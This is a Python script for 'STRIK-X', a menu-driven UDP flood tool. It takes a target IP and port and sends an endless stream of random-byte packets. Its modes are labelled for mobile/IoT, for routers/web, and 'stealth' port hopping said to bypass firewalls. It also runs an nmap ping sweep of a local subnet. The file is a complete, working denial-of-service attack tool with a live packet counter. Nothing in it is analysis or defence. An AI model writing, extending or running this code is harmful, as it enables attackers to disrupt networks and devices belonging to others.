import socket
import os
import sys
import time
import random

def clear():
    os.system('clear')

# Palette Colors
GREY = "\033[1;30m"
WHITE = "\033[1;37m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
PURPLE = "\033[1;35m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

def show_logo():
    clear()
    print(f"{RED}")
    print("      ███████╗████████╗██████╗ ██╗██╗  ██╗      ██╗  ██╗")
    print("      ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝      ╚██╗██╔╝")
    print("      ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗ ╚███╔╝ ")
    print("      ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ╚════╝ ██╔██╗ ")
    print("      ███████║   ██║   ██║  ██║██║██║  ██╗      ██╔╝ ██╗")
    print("      ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝      ╚═╝  ╚═╝")
    print(f"{GREY} -------------------------------------------------------")
    print(f"{GREY}  STRIK-X | V4.1 FULL UI EDITION")
    print(f"{GREY}  Modes: Mobile [1] | Network [2] | Stealth [3]")
    print(f"{GREY} -------------------------------------------------------{RESET}")

while True:
    show_logo()
    print(f"\n{YELLOW}[ MAIN MENU ]")
    print(f"{GREEN}[1] 🚀 START ATTACK SESSION")
    print(f"{CYAN}[2] 🔍 NETWORK SCAN")

    main_choice = input(f"\n{WHITE}ACTION > {RESET}").strip()

    if main_choice == '2':
        os.system("nmap -sn 192.168.1.0/24")
        input(f"\n{WHITE}Press [Enter]...{RESET}")
        continue
    elif main_choice != '1':
        if main_choice:
            print(f"\n{RED}[!] Invalid Choice!{RESET}")
            time.sleep(1)
        continue

    show_logo()
    print(f"\n{WHITE} Enter target details below:{RESET}")
    target_input = input(f" {RED}TARGET IP{GREY}$ {RESET}").strip()
    if not target_input: continue
    
    if ":" in target_input:
        try:
            ip_addr, port_addr = target_input.split(":")
            port_addr = int(port_addr)
        except: continue
    else:
        ip_addr, port_addr = target_input, 80

    print(f"\n{YELLOW}[ SELECT ATTACK MODE FOR {ip_addr} ]")
    print(f"{GREEN}[1] MOBILE STICK   {GREY}- Small/Ultra Fast (For Mobile/IoT){RESET}")
    print(f"{GREEN}[2] NETWORK BURST  {GREY}- Large/Heavy (For Routers/Web){RESET}")
    print(f"{GREEN}[3] STEALTH RANDOM {GREY}- Port Hopping (Bypass Firewalls){RESET}")
    
    mode_choice = input(f"\n{WHITE}MODE > {RESET}").strip()
    if mode_choice not in ['1', '2', '3']: continue

    size = 64 if mode_choice == '1' else 2048
    if mode_choice == '3': size = 512
    
    data = os.urandom(size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    show_logo()
    print(f"\n{RED}[!] STRIKE STARTED ON {ip_addr}:{port_addr}...{RESET}")
    count = 0
    start_time = time.time()
    
    try:
        while True:
            current_port = random.randint(1, 65535) if mode_choice == '3' else port_addr
            sock.sendto(data, (ip_addr, current_port))
            count += 1
            
            if count % 100 == 0:
                if count >= 1000000: display_count = f"{count/1000000:.2f}M"
                elif count >= 1000: display_count = f"{count/1000:.1f}K"
                else: display_count = str(count)
                
                log = (f"{YELLOW}>>{GREY}[{GREEN}SENDING{PURPLE}|{WHITE}Pkts:{RED}{display_count.ljust(8)} "
                       f"{GREEN}=>{YELLOW}{ip_addr}:{current_port}{GREY}]{RESET}\r")
                sys.stdout.write(log)
                sys.stdout.flush()
    except KeyboardInterrupt:
        end_time = time.time()
        duration = max(end_time - start_time, 0.001)
        
        # --- แก้ไขตรงเครื่องหมายตกใจและจัดระเบียบตรงนี้ ---
        print(f"\n\n{GREY}-------------------------------------------")
        print(f"{RED} [!]  SESSION TERMINATED")
        print(f"{WHITE} TOTAL PACKETS SENT : {GREEN} {count}")
        print(f"{WHITE} TOTAL DURATION     : {CYAN} {round(duration, 2)}s")
        print(f"{WHITE} AVERAGE SPEED      : {PURPLE} {round(count/duration, 2)} p/s")
        print(f"{GREY}-------------------------------------------{RESET}")
        input(f"\n{WHITE} Press [Enter] to return to Menu...{RESET}")
        continue
